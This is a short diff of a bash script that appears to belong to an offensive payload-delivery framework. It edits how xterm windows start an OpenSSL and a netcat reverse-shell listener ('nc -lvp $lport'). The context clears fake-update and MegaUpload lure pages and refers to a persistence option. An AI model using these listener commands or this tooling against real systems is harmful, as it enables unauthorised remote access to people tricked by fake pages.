@@ -12378,7 +12378,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo OpenSSL:[$CN]=CN [key].pem [cert].pem;echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo OpenSSL:[$CN] [key].pem [cert].pem;echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport;dtr=$(date|awk {'print $1,$2,$3,$4'})"
 cd $IPATH
 sleep 2
 
@@ -12394,7 +12394,6 @@ rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 
-dtr=$(date)
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
@@ -12608,7 +12607,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
-xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport;dtr=$(date|awk {'print $1,$2,$3,$4'})"
 cd $IPATH
 sleep 2
 
@@ -12623,7 +12622,7 @@ rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
-dtr=$(date)
+
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
